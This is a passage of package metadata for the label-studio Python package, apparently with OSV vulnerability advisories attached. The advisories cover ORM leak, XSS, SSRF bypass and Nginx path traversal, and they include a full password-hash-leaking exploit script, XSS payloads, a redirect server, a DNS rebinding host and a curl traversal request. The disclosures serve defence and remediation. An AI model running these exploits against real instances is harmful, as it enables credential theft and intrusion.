prepare_params=None, all_fields=False): <1>\n        \"\"\"\n        :param fields_for_evaluation: list of annotated fields in task\n        :param prepare_params: filters, ordering, selected items\n        :param all_fields: evaluate all fields for task\n        :param request: request for user extraction\n        :return: task queryset with annotated fields\n        \"\"\"\n        queryset = self.only_filtered(prepare_params=prepare_params)\n        return self.annotate_queryset(\n            queryset,\n            fields_for_evaluation=fields_for_evaluation,\n            all_fields=all_fields,\n            request=prepare_params.request\n        )\n\n    def only_filtered(self, prepare_params=None):\n        request = prepare_params.request\n        queryset = TaskQuerySet(self.model).filter(project=prepare_params.project) <1>\n        fields_for_filter_ordering = get_fields_for_filter_ordering(prepare_params)\n        queryset = self.annotate_queryset(queryset, fields_for_evaluation=fields_for_filter_ordering, request=request)\n        return queryset.prepared(prepare_params=prepare_params)\n```\n1. Special Django method for the `models.Manager` class that is used to retrieve the queryset for querying objects of a model.\n2. Uses the vulnerable `TaskQuerySet` that was explained above.\n\nThe following code snippet of the `Task` model in [`label_studio/tasks/models.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/models.py#L49C1-L102C102) shows that the vulnerable `PreparedTaskManager` is set as a class variable, along with the `updated_by` relational mapping to a Django user that will be exploited as the entrypoint of the filter chain.\n\n```python\n# ...\nclass Task(TaskMixin, models.Model):\n    \"\"\" Business tasks from project\n    \"\"\"\n    id = models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID', db_index=True)\n\n    # ...\n\n    updated_by = models.ForeignKey(settings.AUTH_USER_MODEL, related_name='updated_tasks',\n        on_delete=models.SET_NULL, null=True, verbose_name=_('updated by'),\n        help_text='Last annotator or reviewer who updated this task') <1>\n\n    # ...\n\n    objects = TaskManager()  # task manager by default\n    prepared = PreparedTaskManager()  # task manager with filters, ordering, etc for data_manager app <2>\n\n    # ...\n```\n1. The entry point of the filter chain to filter by the `updated_by__active_organization__active_users__password`.\n2. The vulnerable `PreparedTaskManager` being set that will be exploited.\n\nFinally, the `TaskListAPI` view set in [`label_studio/tasks/api.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/api.py#L205) with the `/api/tasks` API endpoint uses the vulnerable `PreparedTaskManager` to filter `Task` objects.\n\n```python\n    def get_queryset(self):\n        task_id = self.request.parser_context['kwargs'].get('pk')\n        task = generics.get_object_or_404(Task, pk=task_id)\n        review = bool_from_request(self.request.GET, 'review', False)\n        selected = {\"all\": False, \"included\": [self.kwargs.get(\"pk\")]}\n        if review:\n            kwargs = {\n                'fields_for_evaluation': ['annotators', 'reviewed']\n            }\n        else:\n            kwargs = {'all_fields': True}\n        project = self.request.query_params.get('project') or self.request.data.get('project')\n        if not project:\n            project = task.project.id\n        return self.prefetch(\n            Task.prepared.get_queryset(\n                prepare_params=PrepareParams(project=project, selectedItems=selected, request=self.request),\n                **kwargs\n            )) <1>\n```\n1. Uses the vulnerable `PreparedTaskManager` to filter objects.\n\n# Proof of Concept\n\nBelow are the steps to exploit about how to exploit this vulnerability to leak the password hash of an account on Label Studio.\n\n1. Create two accounts on Label Studio and choose one account to be the victim and the other the hacker account that you will use.\n2. Create a new project or use an existing project, then add a task to the project. Update the task with the hacker account to cause the entry point of the filter chain.\n3. Navigate to the task view for the project and add any filter with the `Network` inspect tab open on the browser. Look for a `PATCH` request to `/api/dm/views/{view_id}?interaction=filter&project={project_id}` and save the `view_id` and `project_id` for the next step.\n4. Download the attached proof of concept exploit script named `labelstudio_ormleak.py`. This script will leak the password hash of the victim account character by character. Run the following command to run the exploit script, replacing the `{view_id}`, `{project_id}`, `{cookie_str}` and `{url}` with the corresponding values. For further explanation run `python3 labelstudio_ormleak.py --help`.\n\n```bash\npython3 labelstudio_ormleak.py -v {view_id} -p {project_id} -c '{cookie_str}' -u '{url}'\n```\n\nThe following example GIF demonstrates exploiting this ORM Leak vulnerability to retrieve the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=`.\n\n![labelstudio_ormleak_poc](https://user-images.githubusercontent.com/139727151/266986646-a3d1367c-fb4d-4482-9b6a-18a5d7316385.gif)\n\n# Impact\n\nThis vulnerability can be exploited to completely compromise the confidentiality of highly sensitive account information, such as account password hashes. For all versions `<=1.8.1`, this finding can also be chained with hard coded `SECRET_KEY` to forge session tokens of any user on Label Studio and could be abuse to deteriorate the integrity and availability.\n\n# Remediation Advice\n\n* Do not use unsanitised values for constructing a filter for querying objects using Django's ORM. Django's ORM allows querying by relation field and performs auto lookups, that enable filtering by sensitive fields.\n* Validate filter values to an allow list before performing any queries.\n\n# Discovered\n- August 2023, Alex Brown, elttam\n\n---\n# `labelstudio_ormleak.py` proof of concept\n\n```py\nimport argparse\nimport re\nimport requests\nimport string\nimport sys\n\n# Password hash characters\nCHARS = string.ascii_letters + string.digits + '$/+=_!'\nCHARS_LEN = len(CHARS)\n\nPAYLOAD = {\n    \"data\": {\n        \"columnsDisplayType\": {},\n        \"columnsWidth\": {},\n        \"filters\": {\n            \"conjunction\": \"and\",\n            \"items\": [\n                {\n                    \"filter\": \"filter:tasks:updated_by__active_organization__active_users__password\", # ORM Leak filter chain\n                    \"operator\": \"regex\", # Use regex operator to filter password hash value\n                    \"type\": \"String\",\n                    \"value\": \"REPLACEME\"\n                }\n            ]\n        },\n        \"gridWidth\": 4,\n        \"hiddenColumns\":{\"explore\":[\"tasks:inner_id\"],\"labeling\":[\"tasks:id\",\"tasks:inner_id\"]},\n        \"ordering\": [],\n        \"search_text\": None,\n        \"target\": \"tasks\",\n        \"title\": \"Default\",\n        \"type\": \"list\"\n    },\n    \"id\": 1, # View ID\n    \"project\": \"1\" # Project ID\n}\n\ndef parse_args() -> argparse.Namespace:\n    parser = argparse.ArgumentParser(\n        description='Leak an accounts password hash by exploiting a ORM Leak vulnerability in Label Studio'\n    )\n\n    parser.add_argument(\n        '-v', '--view-id',\n        help='View id of the page',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-p', '--project-id',\n        help='Project id to filter tasks for',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-c', '--cookie-str',\n        help='Cookie string for authentication',\n        required=True\n    )\n\n    parser.add_argument(\n        '-u', '--url',\n        help='Base URL to Label Studio instance',\n        required=True\n    )\n\n    return parser.parse_args()\n\ndef setup() -> dict:\n    args = parse_args()\n    view_id = args.view_id\n    project_id = args.project_id\n    path_1 = \"/api/dm/views/{view_id}?interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    path_2 = \"/api/tasks?page=1&page_size=1&view={view_id}&interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    PAYLOAD[\"id\"] = view_id\n    PAYLOAD[\"project\"] = str(project_id)\n    \n    config_dict = {\n        'COOKIE_STR': args.cookie_str,\n        'URL_PATH_1': args.url + path_1,\n        'URL_PATH_2': args.url + path_2,\n        'PAYLOAD': PAYLOAD\n    }\n    return config_dict\n\ndef test_payload(config_dict: dict, payload) -> bool:\n    sys.stdout.flush()\n    cookie_str = config_dict[\"COOKIE_STR\"]\n    r_set = requests.patch(\n        config_dict[\"URL_PATH_1\"],\n        json=payload,\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_listen = requests.get(\n        config_dict['URL_PATH_2'],\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_json = r_listen.json()\n    return len(r_json[\"tasks\"]) >= 1\n\ndef test_char(config_dict, known_hash, c):\n    json_payload_suffix = PAYLOAD\n    test_escaped = re.escape(known_hash + c)\n    json_payload_suffix[\"data\"][\"filters\"][\"items\"][0][\"value\"] =  f\"^{test_escaped}\"\n\n    suffix_result = test_payload(config_dict, json_payload_suffix)\n    if suffix_result:\n        return (known_hash + c, c)\n    \n    return None\n\ndef main():\n    config_dict = setup()\n    # By default Label Studio password hashes start with these characters\n    known_hash = \"pbkdf2_sha256$260000$\"\n    print()\n    print(f\"dumped: {known_hash}\", end=\"\")\n    sys.stdout.flush()\n\n    while True:\n        found = False\n\n        for c in CHARS:\n            r = test_char(config_dict, known_hash, c)\n            if not r is None:\n                new_hash, c = r\n                known_hash = new_hash\n                print(c, end=\"\")\n                sys.stdout.flush()\n                found = True\n                break\n\n        if not found:\n            break\n\n    print()\n\nif __name__ == \"__main__\":\n    main()\n```","fixed_in":["1.9.2.post0"],"id":"GHSA-6hjj-gq77-j4qw","link":"https://osv.dev/vulnerability/GHSA-6hjj-gq77-j4qw","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-26152"],"details":"### Summary\nOn all Label Studio versions prior to 1.11.0, data imported via file upload feature is not properly sanitized prior to being rendered within a [`Choices`](https://labelstud.io/tags/choices) or [`Labels`](https://labelstud.io/tags/labels) tag, resulting in an XSS vulnerability.\n\n### Details\nNeed permission to use the \"data import\" function. This was reproduced on Label Studio 1.10.1.\n\n### PoC\n\n1. Create a project.\n![Create a project](https://github.com/HumanSignal/label-studio/assets/3943358/9b1536ad-feac-4238-a1bd-ca9b1b798673)\n\n2. Upload a file containing the payload using the \"Upload Files\" function.\n![2  Upload a file containing the payload using the Upload Files function](https://github.com/HumanSignal/label-studio/assets/3943358/26bb7af1-1cd2-408f-9adf-61e31a5b7328)\n![3  complete](https://github.com/HumanSignal/label-studio/assets/3943358/f2f62774-1fa6-4456-9e6f-8fa1ca0a2d2e)\n\nThe following are the contents of the files used in the PoC\n```\n{\n  \"data\": {\n    \"prompt\": \"labelstudio universe image\",\n    \"images\": [\n      {\n        \"value\": \"id123#0\",\n        \"style\": \"margin: 5px\",\n        \"html\": \"<img width='400' src='https://labelstud.io/_astro/images-tab.64279c16_ZaBSvC.avif' onload=alert(document.cookie)>\"\n      }\n    ]\n  }\n}\n```\n\n3. Select the text-to-image generation labeling template of Ranking and scoring\n![3  Select the text-to-image generation labelling template for Ranking and scoring](https://github.com/HumanSignal/label-studio/assets/3943358/f227f49c-a718-4738-bc2a-807da4f97155)\n![5  save](https://github.com/HumanSignal/label-studio/assets/3943358/9b529f8a-8e99-4bb0-bdf6-bb7a95c9b75d)\n\n4. Select a task\n![4  Select a task](https://github.com/HumanSignal/label-studio/assets/3943358/71856b7a-2b1f-44ea-99ab-fc48bc20caa7)\n\n5. Check that the script is running\n![5  Check that the script is running](https://github.com/HumanSignal/label-studio/assets/3943358/e396ae7b-a591-4db7-afe9-5bab30b48cb9)\n\n### Impact\nMalicious scripts can be injected into the code, and when linked with vulnerabilities such as CSRF, it can cause even greater damage. In particular, It can become a source of further attacks, especially when linked to social engineering.\n","fixed_in":["1.11.0"],"id":"GHSA-6xv9-957j-qfhg","link":"https://osv.dev/vulnerability/GHSA-6xv9-957j-qfhg","source":"osv","summary":null,"withdrawn":null}]},"0.9.0.post5":{"info":{"author":"Heartex","author_email":"hello@heartex.ai","bugtrack_url":null,"classifiers":["License :: OSI Approved :: MIT License","Operating System :: OS Independent","Programming Language :: Python :: 3"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"https://github.com/heartexlabs/label-studio","keywords":"","license":"","maintainer":"","maintainer_email":"","name":"label-studio","package_url":"https://pypi.org/project/label-studio/","platform":"","project_url":"https://pypi.org/project/label-studio/","project_urls":{"Homepage":"https://github.com/heartexlabs/label-studio"},"provides_extra":null,"release_url":"https://pypi.org/project/label-studio/0.9.0.post5/","requires_dist":["pip (>=20.2.3)","appdirs (==1.4.3)","attrs (>=19.1.0)","blis (==0.4.1)","certifi (==2019.11.28)","chardet (==3.0.4)","click (~=7.0)","cymem (==2.0.3)","Flask (==1.1.1)","idna (==2.8)","itsdangerous (==1.1.0)","Jinja2 (==2.10.3)","lxml (>=4.2.5)","MarkupSafe (==1.1.1)","mixpanel (==4.4.0)","numpy (>=1.17.4)","python-dateutil (==2.8.1)","pytz (==2019.3)","requests (>=2.22.0)","six (>=1.13.0)","srsly (>=0.2.0)","tqdm (>=4.40.2)","urllib3 (==1.25.7)","wasabi (==0.4.2)","Werkzeug (==0.16.0)","ordered-set (==4.0.2)","orjson (>=2.0.11)","rarfile (==3.1)","flask-api (>=2.0)","pandas (>=0.24.0)","jsonschema (>=3.2.0)","xmljson (==0.2.0)","rq (>=1.0)","boto3 (>=1.12.32)","google-cloud-storage (==1.28.1)","flask-wtf (==0.14.3)","label-studio-converter (>=0.0.22)","htmlmin (==0.1.12)","gevent (>=20.6.2)","ujson (==3.0.0)","Colorama (==0.4.4)","boxing (==0.1.4)","pyyaml (>=5.3.1)"],"requires_python":">=3.5, <3.9","summary":"Label Studio annotation tool","version":"0.9.0.post5","yanked":false,"yanked_reason":null},"last_serial":25820833,"urls":[{"comment_text":"","digests":{"blake2b_256":"1409db9b3d193681e9ef18bc7d9e6b7afffbd291ccfd171f0fd8060e02e0519f","md5":"c4d22eb6c5e3bb636e733a8d121518be","sha256":"14f684bc241576c66e2c9e9cb942873713f37adca11a620f9aeb80035b9eb401"},"downloads":-1,"filename":"label_studio-0.9.0.post5-py3-none-any.whl","has_sig":false,"md5_digest":"c4d22eb6c5e3bb636e733a8d121518be","packagetype":"bdist_wheel","python_version":"py3","requires_python":">=3.5, <3.9","size":16328315,"upload_time":"2021-01-25T11:38:51","upload_time_iso_8601":"2021-01-25T11:38:51.706301Z","url":"https://files.pythonhosted.org/packages/14/09/db9b3d193681e9ef18bc7d9e6b7afffbd291ccfd171f0fd8060e02e0519f/label_studio-0.9.0.post5-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"09d0522e910c07b470b621c997739d21c22a295539465a75563a4ab62203318d","md5":"ba9fc9848564c95158ca422c07e7d97e","sha256":"bf90097326ec142552b6d736dcbf81ed81db3a9cbc71b308f61db5055107125e"},"downloads":-1,"filename":"label-studio-0.9.0.post5.tar.gz","has_sig":false,"md5_digest":"ba9fc9848564c95158ca422c07e7d97e","packagetype":"sdist","python_version":"source","requires_python":">=3.5, <3.9","size":16198953,"upload_time":"2021-01-25T11:39:03","upload_time_iso_8601":"2021-01-25T11:39:03.164519Z","url":"https://files.pythonhosted.org/packages/09/d0/522e910c07b470b621c997739d21c22a295539465a75563a4ab62203318d/label-studio-0.9.0.post5.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF. This issue is fixed in version 1.6.0.","fixed_in":["1.6.0"],"id":"GHSA-pc6f-259w-w3j6","link":"https://osv.dev/vulnerability/GHSA-pc6f-259w-w3j6","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF.","fixed_in":["1.5.0.post0"],"id":"PYSEC-2022-300","link":"https://osv.dev/vulnerability/PYSEC-2022-300","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47116"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to [`1.11.0`](https://github.com/HumanSignal/label-studio/releases/tag/1.11.0) and was tested on version `1.8.2`.\n\n# Overview\n\nLabel Studio's SSRF protections that can be enabled by setting the `SSRF_PROTECTION_ENABLED` environment variable can be bypassed to access internal web servers. This is because the current SSRF validation is done by executing a single DNS lookup to verify that the IP address is not in an excluded subnet range. This protection can be bypassed by either using HTTP redirection or performing a [DNS rebinding attack](https://en.wikipedia.org/wiki/DNS_rebinding).\n\n# Description\n\nThe following `tasks_from_url` method in [`label_studio/data_import/uploader.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_import/uploader.py#L127-L155) performs the SSRF validation (`validate_upload_url`) before sending the request.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1]\n\n        validate_upload_url(url, block_local_urls=settings.SSRF_PROTECTION_ENABLED)\n        # Reason for #nosec: url has been validated as SSRF safe by the\n        # validation check above.\n        response = requests.get(\n            url, verify=False, headers={'Accept-Encoding': None}\n        )  # nosec\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(\n            user, project, SimpleUploadedFile(filename, file_content)\n        )\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(\n            project, file_upload_ids\n        )\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n\nThe `validate_upload_url` code in [`label_studio/core/utils/io.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/core/utils/io.py#L174-L209) is shown below.\n\n```python\ndef validate_upload_url(url, block_local_urls=True):\n    \"\"\"Utility function for defending against SSRF attacks. Raises\n        - InvalidUploadUrlError if the url is not HTTP[S], or if block_local_urls is enabled\n          and the URL resolves to a local address.\n        - LabelStudioApiException if the hostname cannot be resolved\n\n    :param url: Url to be checked for validity/safety,\n    :param block_local_urls: Whether urls that resolve to local/private networks should be allowed.\n    \"\"\"\n\n    parsed_url = parse_url(url)\n\n    if parsed_url.scheme not in ('http', 'https'):\n        raise InvalidUploadUrlError\n\n    domain = parsed_url.host\n    try:\n        ip = socket.gethostbyname(domain)\n    except socket.error:\n        from core.utils.exceptions import LabelStudioAPIException\n        raise LabelStudioAPIException(f\"Can't resolve hostname {domain}\")\n\n    if not block_local_urls:\n        return\n\n    if ip == '0.0.0.0':  # nosec\n        raise InvalidUploadUrlError\n    local_subnets = [\n        '127.0.0.0/8',\n        '10.0.0.0/8',\n        '172.16.0.0/12',\n        '192.168.0.0/16',\n    ]\n    for subnet in local_subnets:\n        if ipaddress.ip_address(ip) in ipaddress.ip_network(subnet):\n            raise InvalidUploadUrlError\n```\n\nThe issue here is the SSRF validation is only performed before the request is sent, and does not validate the destination IP address. Therefore, an attacker can either redirect the request or perform a DNS rebinding attack to bypass this protection.\n\n# Proof of Concept\n\nBoth the HTTP redirection and DNS rebinding methods for bypassing Label Studio's SSRF protections are explained below.\n\n### HTTP Redirection\n\nThe python `requests` module automatically follows HTTP redirects (eg. response code `301` and `302`). Therefore, an attacker could use a URL shortener (eg. `https://www.shorturl.at/`) or host the following Python code on an external server to redirect request from a Label Studio server to an internal web server.\n\n```python\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\n\nclass RedirectHandler(BaseHTTPRequestHandler):\n\n    def do_GET(self):\n        self.send_response(301)\n        # skip first slash\n        self.send_header('Location', self.path[1:])\n        self.end_headers()\n\nHTTPServer((\"\", 8080), RedirectHandler).serve_forever()\n```\n\n### DNS Rebinding Attack\n\nDNS rebinding can bypass SSRF protections by resolving to an external IP address for the first resolution, but when the request is sent resolves to an internal IP address that is blocked. For an example, the domain `7f000001.030d1fd6.rbndr.us` will randomly switch between the IP address `3.13.31.214` that is not blocked to `127.0.0.1` which is not allowed.\n\n# Impact\n\nSSRF vulnerabilities pose a significant risk on cloud environments, since instance credentials are managed by internal web APIs. An attacker can bypass Label Studio's SSRF protections to access internal web servers and partially compromise the confidentiality of those internal servers.\n\n# Remediation Advice\n\n* Before saving any responses, validate the destination IP address is not in the deny list.\n* Consider blocking internal cloud API IP ranges to mitigate the risk of compromising cloud credentials.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.11.0"],"id":"GHSA-p59w-9gqw-wj8r","link":"https://osv.dev/vulnerability/GHSA-p59w-9gqw-wj8r","source":"osv","summary":null,"withdrawn":null},{"aliases":[],"details":"### Summary\nThe vulnerability resides on the Nginx config file:\nhttps://github.com/heartexlabs/label-studio/blob/53944e6bcede75ca5c102d655013f2e5238e85e6/deploy/default.conf#L119\n\nThe pattern on location /static indicates a popular misconfiguration on Nginx servers presented in 2018 originally by Orange Tsai. This vulnerability allows an attacker to use a single path traversal payload in the matched location to traverse one directory above. This vulnerability only happens due to the location /static directive not having a slash `/` at the end, the following code shows an example of a safe configuration:\n```nginx\nlocation /static/ {\n[...]\n```\nThe vulnerability works because Nginx will think that `/static../` is a directory that should also be aliased to the folder, allowing /static/../ to be reached. In Label Studio's case, this means all files on /label_studio/core/ are exposed.\n\nOf course, this means that only Label Studio instances that were deployed using the default nginx files introducted at Mar 31, 2021.\nThis is a very easy vulnerability to fix, and just a lesser-known configuration mistake on nginx files. It's very easy to happen because all is needed is for one slash to be missing. (Off-By-One)\n\n** Proof-of-Concept (Leaking Secret Keys): **\nExploiting this vulnerability usually depends on what's on the parent folder, in Label Studio's case the most interesting file I could find that's on there by default is /label_studio/core/ . We can fetch it by simply making a request to the traversed folder.\n```bash\n# Production Label Studio docker-compose running on localhost:8080\n/t/mydata [127]$ curl localhost:8080/static../settings/label_studio.py\n\"\"\"This file and its contents are licensed under the Apache License 2.0. Please see the included NOTICE for copyright information and LICENSE for a copy of the license.\n\"\"\"\nimport os\nimport pathlib\n\nfrom core.settings.base import *\n\nDJANGO_DB = get_env('DJANGO_DB', DJANGO_DB_SQLITE)\nDATABASES = {'default': DATABASES_ALL[DJANGO_DB]}\n\nMIDDLEWARE.append('organizations.middleware.DummyGetSessionMiddleware')\nMIDDLEWARE.append('core.middleware.UpdateLastActivityMiddleware')\nif INACTIVITY_SESSION_TIMEOUT_ENABLED:\n    MIDDLEWARE.append('core.middleware.InactivitySessionTimeoutMiddleWare')\n\nADD_DEFAULT_ML_BACKENDS = False\n\nLOGGING['root']['level'] = get_env('LOG_LEVEL', 'WARNING')\n\nDEBUG = get_bool_env('DEBUG', False)\n\nDEBUG_PROPAGATE_EXCEPTIONS = get_bool_env('DEBUG_PROPAGATE_EXCEPTIONS', False)\n\nSESSION_COOKIE_SECURE = False\n\nSESSION_ENGINE = \"django.contrib.sessions.backends.signed_cookies\"\n\nRQ_QUEUES = {}\n\nSENTRY_DSN = get_env(\n    'SENTRY_DSN',\n    'https://68b045ab408a4d32a910d339be8591a4@o227124.ingest.sentry.io/5820521'\n)\nSENTRY_ENVIRONMENT = get_env('SENTRY_ENVIRONMENT', 'opensource')\n\nFRONTEND_SENTRY_DSN = get_env(\n    'FRONTEND_SENTRY_DSN',\n    'https://5f51920ff82a4675a495870244869c6b@o227124.ingest.sentry.io/5838868')\nFRONTEND_SENTRY_ENVIRONMENT = get_env('FRONTEND_SENTRY_ENVIRONMENT', 'opensource')\n\nEDITOR_KEYMAP = json.dumps(get_env(\"EDITOR_KEYMAP\"))\n\nfrom label_studio import __version__\nfrom label_studio.core.utils import sentry\nsentry.init_sentry(release_name='label-studio', release_version=__version__)\n\n# we should do it after sentry init\nfrom label_studio.core.utils.common import collect_versions\nversions = collect_versions()\n\n# in Label Studio Community version, feature flags are always ON\nFEATURE_FLAGS_DEFAULT_VALUE = True\n# or if file is not set, default is using offline mode\nFEATURE_FLAGS_OFFLINE = get_bool_env('FEATURE_FLAGS_OFFLINE', True)\n\nfrom core.utils.io import find_file\nFEATURE_FLAGS_FILE = get_env('FEATURE_FLAGS_FILE', 'feature_flags.json')\nFEATURE_FLAGS_FROM_FILE = True\ntry:\n    from core.utils.io import find_node\n    find_node('label_studio', FEATURE_FLAGS_FILE, 'file')\nexcept IOError:\n    FEATURE_FLAGS_FROM_FILE = False\n\nSTORAGE_PERSISTENCE = get_bool_env('STORAGE_PERSISTENCE', True)\n```\n\n\n### Impact\nThe impact consists on leaking Django secret keys by default, with also greater risk being possible due to the vulnerability exposing the file located at /label_studio/core/settings/label_studio.py which contains the secret key for Django as well as possibly containing other secrets the user might put there. (If the administrator decides not to use environment variables for some variables)\n","fixed_in":["1.7.2"],"id":"GHSA-cpmr-mw4j-99r7","link":"https://osv.dev/vulnerability/GHSA-cpmr-mw4j-99r7","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47115"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2` and was tested on version `1.8.2`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) has a cross-site scripting (XSS) vulnerability that could be exploited when an authenticated user uploads a crafted image file for their avatar that gets rendered as a HTML file on the website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/functions.py#L18-L49) shows that the only verification check is that the file is an image by extracting the dimensions from the file.\n\n```python\n\ndef hash_upload(instance, filename):\n    filename = str(uuid.uuid4())[0:8] + '-' + filename\n    return settings.AVATAR_PATH + '/' + filename <3>\n\n\ndef check_avatar(files):\n    images = list(files.items())\n    if not images:\n        return None\n\n    filename, avatar = list(files.items())[0]  # get first file\n    w, h = get_image_dimensions(avatar) <1>\n    if not w or not h:\n        raise forms.ValidationError(\"Can't read image, try another one\")\n\n    # validate dimensions\n    max_width = max_height = 1200\n    if w > max_width or h > max_height:\n        raise forms.ValidationError('Please use an image that is %s x %s pixels or smaller.'\n                                    % (max_width, max_height))\n\n    # validate content type\n    main, sub = avatar.content_type.split('/') <2>\n    if not (main == 'image' and sub.lower() in ['jpeg', 'jpg', 'gif', 'png']):\n        raise forms.ValidationError(u'Please use a JPEG, GIF or PNG image.')\n\n    # validate file size\n    max_size = 1024 * 1024\n    if len(avatar) > max_size:\n        raise forms.ValidationError('Avatar file size may not exceed ' + str(max_size/1024) + ' kb')\n\n    return avatar\n```\n1. Attempts to get image dimensions to validate the uploaded avatar file is an image.\n2. Extracts the `Content-Type` from the upload `POST` request. A user can easily bypass this verification by changing the mimetype of the uploaded file to an allowed type (eg. `image/jpeg`).\n3. The file extension of the uploaded file is never validated and is saved to the filesystem.\n\n[Label Studio serves avatar images using Django's built-in `serve` view](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/urls.py#L25-L26), which is [not secure for production use according to Django's documentation](https://docs.djangoproject.com/en/4.2/ref/views/#serving-files-in-development).\n\n```python\n    re_path(r'^data/' + settings.AVATAR_PATH + '/(?P<path>.*)$', serve,\n            kwargs={'document_root': join(settings.MEDIA_ROOT, settings.AVATAR_PATH)}),\n```\n\nThe issue with the Django `serve` view is that it determines the `Content-Type` of the response by the file extension in the URL path. Therefore, an attacker can upload an image that contains malicious HTML code and name the file with a `.html` extension to be rendered as a HTML page. The only file extension validation is performed on the client-side, which can be easily bypassed.\n\n# Proof of Concept\n\nBelow are the steps to reproduce this issue and execute JavaScript code in the context of the Label Studio website.\n\n1. Using any JPEG or PNG image, add in the comment field in the metadata the HTML code `<script>alert(document.domain)</script>`. This can be done using the `exiftool` command as shown below that was used to create the following image.\n\n```bash\nexiftool -Comment='<script>alert(document.domain)</script>' penguin.jpg\n```\n\n![xss-penguin](https://user-images.githubusercontent.com/139727151/266989884-c2cd9b4f-f374-416e-a468-acf41f52e088.jpg)\n\n2. On Label Studio, navigate to account & settings page and intercept the upload request of the avatar image using a tool such as Burp Suite. Modify the filename in the request to have a `.html` extension.\n\n3. Right click the image on the avatar profile and copy the URL. Send this to a victim and it will display an alert box with the host name of the Label Studio instance as shown below.\n\n![xss-alert](https://user-images.githubusercontent.com/139727151/266989952-6fb74c6e-9961-447c-a602-5a6f36627ae6.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* Validate the file extension on the server side, not in client-side code.\n* Remove the use of Django's `serve` view and implement a secure controller for viewing uploaded avatar images.\n* Consider saving file content in the database rather than on the filesystem to mitigate against other file related vulnerabilities.\n* Avoid trusting user controlled inputs.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.9.2"],"id":"GHSA-q68h-xwq5-mm7x","link":"https://osv.dev/vulnerability/GHSA-q68h-xwq5-mm7x","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-23633"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.10.1` and was tested on version `1.9.2.post0`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) had a remote import feature allowed users to import data from a remote web source, that was downloaded and could be viewed on the website. This feature could had been abused to download a HTML file that executed malicious JavaScript code in the context of the Label Studio website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/uploader.py#L125C5-L146) showed that is a URL passed the SSRF verification checks, the contents of the file would be downloaded using the filename in the URL.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1] <1>\n\n        response = ssrf_safe_get(\n            url, verify=project.organization.should_verify_ssl_certs(), stream=True, headers={'Accept-Encoding': None}\n        )\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(user, project, SimpleUploadedFile(filename, file_content))\n        if 